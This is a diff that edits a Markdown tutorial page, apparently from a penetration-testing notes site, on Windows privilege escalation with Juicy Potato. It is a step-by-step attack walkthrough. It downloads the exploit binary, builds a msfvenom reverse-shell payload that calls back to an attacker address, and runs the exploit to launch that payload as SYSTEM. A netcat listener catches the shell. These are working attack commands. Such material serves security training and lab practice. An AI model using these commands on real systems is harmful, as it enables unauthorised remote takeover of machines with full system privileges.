@@ -2,62 +2,69 @@
 legal-banner: true
 ---
 
-### **INTRODUCTION**
+### **Introduction**
 
-Service accounts are generally configured with these two privileges. They allow the account to impersonate the access tokens of other users (including the SYSTEM user).
+Service accounts are often configured with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.  
+These allow an account to impersonate the access tokens of other users, including the SYSTEM user.
 
-??? info "IMPORTANT"
+??? info "Important"
 
-    Juicy Potato attacks does NOT work on Windows 10 versions equal to or greater than 1809; and does NOT work on Server 2019 at all, For all versions of Server 2016 and Server 2019 we can use PrintSpoofer.exe, as well as every version of Windows 10 from at least 1607 onwards
+    Juicy Potato does **not** work on Windows 10 version 1809 or later, nor on Server 2019.  
+    For Server 2016, Server 2019, and Windows 10 (1607 onwards), use **PrintSpoofer.exe** instead.
 
-### **EXPLOITING PRIVILEGES WITH JUICY POTATO**
+### **Exploiting privileges with Juicy Potato**
 
-Rotten Potato was quite a limited exploit. Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit. (These steps are for Windows 7)
+Rotten Potato was a limited exploit. Juicy Potato improves on it by leveraging more CLSIDs and methods of exploitation.  
+(The following example uses Windows 7.)
 
-1.  Verify if current user has SeImpersonatePrivilege privileges by running:  
+1.  Verify that the current user has `SeImpersonatePrivilege`:  
     `whoami /priv`  
     
     ![](../../../img/Windows-Environment/144.png)
     
-2.  Use curl to download JuicyPotato.exe from the GitHub repository.  
+2.  Download `JuicyPotato.exe` from GitHub:  
     `curl -L -o JuicyPotato.exe https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`  
 
     ![](../../../img/Windows-Environment/145.png)
 
-    **NOTE:** this is a 64-bit executable. If you need a 32-bit version, you can find that [Here](https://github.com/ohpe/juicy-potato/releases/tag/v0.1).
+    **Note:** This binary is 64-bit. A 32-bit version is available [here](https://github.com/ohpe/juicy-potato/releases/tag/v0.1).
     
-3.  we need to determine the OS version running on Attack Machine By using the following command:  
+3.  Determine the OS version and build:  
     `systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"`  
     
     ![](../../../img/Windows-Environment/146.png)
     
-4.  This is a Windows 10 Professional – Build 10586. Note that ‘build’ and ‘version’ are different. Build 10586 corresponds to version 1511. Since 1511 < 1809, this Machine should be vulnerable if it hasn't been patched.  
+4.  Example: Windows 10 Professional, Build 10586 → Version 1511.  
+    Since 1511 < 1809, the machine is potentially vulnerable if not patched.  
     
     ![](../../../img/Windows-Environment/147.png)
     
-5.  To execute a task as SYSTEM, one approach is to create an executable. This can be achieved using tools such as msfvenom or alternatively, by Using nc.exe   
-    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=1234 -a x64 --platform Windows -f exe -o shell.exe`  
+5.  Generate a reverse shell executable using `msfvenom` (or use `nc.exe`):  
+    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1234 -a x64 --platform Windows -f exe -o shell.exe`  
     
     ![](../../../img/Windows-Environment/148.png)
     
-6.  Download both files onto the target using any one of the techniques found in File Transfer Section  
+6.  Transfer `JuicyPotato.exe` and `shell.exe` to the target (see File Transfer section for techniques).  
     
     ![](../../../img/Windows-Environment/149.png)
     
-7.  Verify If the exploit Works by redirect the output to output.txt file:  
-    `C:\Users\Public\Downloads\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\Users\Public\Downloads\output.txt" -t *`  
+7.  Test the exploit by redirecting output to a file:  
+    ```
+    C:\Users\Public\Downloads\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\Users\Public\Downloads\output.txt" -t *
+    ```  
     
     ![](../../../img/Windows-Environment/150.png)
     
-8.  Start a netcat listener on port 1234 and execute shell.exe using JuicyPotato.exe:  
-    `C:\Users\Public\Downloads\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Downloads\shell.exe" -t *`  
+8.  Start a Netcat listener and execute the reverse shell via Juicy Potato:  
+    ```
+    C:\Users\Public\Downloads\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Downloads\shell.exe" -t *
+    ```  
     
     ![](../../../img/Windows-Environment/151.png)
     
-9.  If the process is created successfully, we have a SYSTEM shell on our listener.  
+9.  If successful, you’ll receive a SYSTEM shell on the listener:  
     `sudo rlwrap -cAr nc -lvnp 1234`  
     
     ![](../../../img/Windows-Environment/152.png)
-    
 
-### **IMPERSONATING THE LOCAL SYSTEM ACCOUNT WITH PRINTSPOOFER**
+### **Impersonating the LOCAL SYSTEM account with PrintSpoofer**
